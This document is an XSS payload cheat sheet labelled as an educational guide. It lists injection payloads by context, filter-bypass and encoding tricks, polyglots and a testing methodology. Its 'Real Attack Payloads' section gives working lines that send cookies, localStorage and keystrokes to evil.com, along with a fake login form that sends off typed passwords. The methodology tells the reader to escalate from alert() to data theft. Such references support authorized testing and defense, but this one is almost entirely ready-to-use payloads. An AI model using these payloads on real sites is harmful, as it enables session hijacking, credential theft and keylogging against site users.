# XSS Payload Techniques — Educational Guide

## 1. Tag Breaking (HTML Injection)

**Concept:** Close the current HTML element, inject your own, then reopen to keep page valid.

### Basic Tag Break
```html
<!-- Original HTML -->
<div class="style">INJECTION_POINT</div>

<!-- Payload -->
</div><script>alert('XSS')</script><div>

<!-- Result -->
<div class="style"></div><script>alert('XSS')</script><div></div>
```

### Deep Nesting Break (shotgun approach)
```html
</span></div></td></tr></table></form><script>alert(1)</script>
```
Closes multiple possible parent elements — works even if you don't know the exact structure.

### Break + Event Handler
```html
</div><img src=x onerror=alert(1)><div>
```

---

## 2. Attribute Injection

**Concept:** If your input lands inside an HTML attribute, break out of it.

### Double Quote Context
```html
<!-- Original -->
<input value="INJECTION_POINT">

<!-- Payload -->
"><script>alert(1)</script><input value="

<!-- Result -->
<input value=""><script>alert(1)</script><input value="">
```

### Single Quote Context
```html
<!-- Original -->
<div title='INJECTION_POINT'>

<!-- Payload -->
'><script>alert(1)</script><div title='

<!-- Result -->
<div title=''><script>alert(1)</script><div title=''>
```

### Event Handler Injection
```html
<!-- Original -->
<div class="INJECTION_POINT">

<!-- Payload -->
x" onmouseover="alert(1)

<!-- Result -->
<div class="x" onmouseover="alert(1)">
```

---

## 3. Event Handlers (No Script Tags)

**Concept:** Many filters block `<script>` but allow other tags with event handlers.

### Image Error (most common)
```html
<img src=x onerror=alert(1)>
<img/src=x onerror=alert(1)>
<img src=x onerror="alert(1)">
```

### SVG (often bypasses filters)
```html
<svg onload=alert(1)>
<svg/onload=alert(1)>
<svg><script>alert(1)</script></svg>
```

### Body/Iframe
```html
<body onload=alert(1)>
<iframe onload=alert(1)>
<iframe src="javascript:alert(1)">
```

### Input/Button
```html
<input onfocus=alert(1) autofocus>
<button onclick=alert(1)>Click</button>
<input onmouseover=alert(1) style="position:fixed;top:0;left:0;width:100%;height:100%">
```

### Marquee/Details (obscure)
```html
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
<audio src=x onerror=alert(1)>
<video src=x onerror=alert(1)>
```

---

## 4. JavaScript Protocol

**Concept:** Some contexts allow `javascript:` URLs.

```html
<a href="javascript:alert(1)">Click me</a>
<iframe src="javascript:alert(1)">
<form action="javascript:alert(1)"><button>Submit</button></form>
<object data="javascript:alert(1)">
```

---

## 5. Encoding Bypasses

**Concept:** Encode payloads to bypass naive filters.

### HTML Entity Encoding
```html
<!-- Filter blocks: alert -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">

<!-- &#97; = 'a', &#108; = 'l', etc. -->
```

### URL Encoding
```html
<a href="javascript:%61%6c%65%72%74(1)">Click</a>
```

### Mixed Case (bypass case-sensitive filters)
```html
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x OnErRoR=alert(1)>
```

### Null Bytes (old browsers)
```html
<scr%00ipt>alert(1)</scr%00ipt>
```

### Double Encoding
```html
%253Cscript%253Ealert(1)%253C/script%253E
```

---

## 6. Template Literal Injection (JavaScript Context)

**Concept:** If input lands inside JavaScript, break out of the string.

### Inside Double Quotes
```javascript
// Original
var name = "INJECTION_POINT";

// Payload
";alert(1);//

// Result
var name = "";alert(1);//";
```

### Inside Template Literals
```javascript
// Original
var html = `<div>${INJECTION_POINT}</div>`;

// Payload
${alert(1)}

// Result — code executes!
var html = `<div>${alert(1)}</div>`;
```

### Inside Single Quotes
```javascript
// Payload
';alert(1);//
```

---

## 7. Filter Bypass Tricks

### No Parentheses
```html
<img src=x onerror=alert`1`>
<svg onload=alert&lpar;1&rpar;>
```

### No Spaces
```html
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>
```

### No Quotes
```html
<img src=x onerror=alert(1)>
<div onclick=alert(1)>click</div>
```

### No Alert (use other functions)
```html
<img src=x onerror=confirm(1)>
<img src=x onerror=prompt(1)>
<img src=x onerror=console.log(1)>
<img src=x onerror=eval('ale'+'rt(1)')>
```

### Break Out of Comments
```html
<!-- INJECTION_POINT -->

Payload: --><script>alert(1)</script><!--
```

---

## 8. DOM-Based XSS

**Concept:** Exploit client-side JavaScript that unsafely handles URL/input.

### URL Fragment
```
https://site.com/page#<img src=x onerror=alert(1)>
```

If the page does:
```javascript
document.getElementById('content').innerHTML = location.hash.slice(1);
```

### PostMessage
```javascript
// If site listens to postMessage unsafely:
window.postMessage('<img src=x onerror=alert(1)>', '*');
```

---

## 9. Polyglot Payloads

**Concept:** Single payload that works in multiple contexts.

### The Classic Polyglot
```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

### Simpler Multi-Context
```html
'"><img src=x onerror=alert(1)>
```

Works if you're in:
- Double quote attribute: breaks out with `"`
- Single quote attribute: breaks out with `'`
- Raw HTML: just renders the img

---

## 10. Real Attack Payloads

### Steal Cookies
```html
<img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">
```

### Steal localStorage
```html
<img src=x onerror="fetch('https://evil.com/?d='+JSON.stringify(localStorage))">
```

### Keylogger
```html
<img src=x onerror="document.onkeypress=function(e){fetch('https://evil.com/?k='+e.key)}">
```

### Fake Login (Phishing)
```html
<img src=x onerror="document.body.innerHTML='<h1>Session Expired</h1><input id=p type=password placeholder=Password><button onclick=fetch(`https://evil.com/?p=`+p.value)>Login</button>'">
```

### Modify Document (Office Add-in specific)
```html
<img src=x onerror="Word.run(c=>{c.document.body.insertParagraph('HACKED',Word.InsertLocation.start);return c.sync()})">
```

---

## Quick Reference Cheat Sheet

| Context | Payload |
|---------|---------|
| Raw HTML | `<script>alert(1)</script>` |
| Inside `<div>` | `</div><script>alert(1)</script><div>` |
| Inside `value=""` | `"><script>alert(1)</script><input value="` |
| Inside `value=''` | `'><script>alert(1)</script><input value='` |
| Inside `onclick=""` | `");alert(1);//` |
| Inside JS string | `";alert(1);//` |
| Inside JS template | `${alert(1)}` |
| Inside HTML comment | `--><script>alert(1)</script><!--` |
| Filter blocks script | `<img src=x onerror=alert(1)>` |
| Filter blocks alert | `<img src=x onerror=confirm(1)>` |
| No parentheses | `<img src=x onerror=alert\`1\`>` |
| No spaces | `<img/src=x/onerror=alert(1)>` |

---

## Testing Methodology

1. **Identify injection point** — Where does your input appear in the HTML?
2. **Determine context** — Raw HTML? Attribute? JavaScript?
3. **Try basic payload** — `<script>alert(1)</script>`
4. **If blocked, identify filter** — What's being stripped/encoded?
5. **Bypass filter** — Use encoding, alternative tags, or context-breaking
6. **Escalate** — Move from alert() to actual attack (steal data, modify page)

---

*For educational and authorized security testing only.*
